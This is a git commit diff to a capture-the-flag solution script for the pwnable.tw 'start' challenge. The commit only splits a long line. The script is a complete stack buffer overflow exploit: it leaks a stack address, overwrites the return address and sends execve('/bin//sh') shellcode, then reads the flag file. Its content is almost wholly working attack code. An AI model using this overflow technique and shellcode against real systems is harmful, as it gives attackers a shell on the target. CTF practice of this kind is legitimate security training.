f2ebd09d0e148e594e16d2df11fcbb8ed97264ba
Sergey Reshetnikov <sreshetnikov@ptsecurity.com>
2019-06-16 22:16:44 -0700

    fix in one line

--- pwnable_tw/start/solution.py
+++ pwnable_tw/start/solution.py
@@ -11,7 +11,9 @@ def main():
     data = s.recv(1024)
     offset_addr = hex(int(data[:4].hex()[:2], 16) + int("14", 16))[2:] + data[:4].hex()[2:]  # offset = 0x14
     s.send(str.encode("A"*20) + bytearray.fromhex(offset_addr)
-           + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')  # http://shell-storm.org/shellcode/files/shellcode-811.php
+           + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89'
+             b'\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+           )  # http://shell-storm.org/shellcode/files/shellcode-811.php
     s.send(str.encode("cat /home/start/flag\n"))
     data = s.recv(1024)
     print(data)
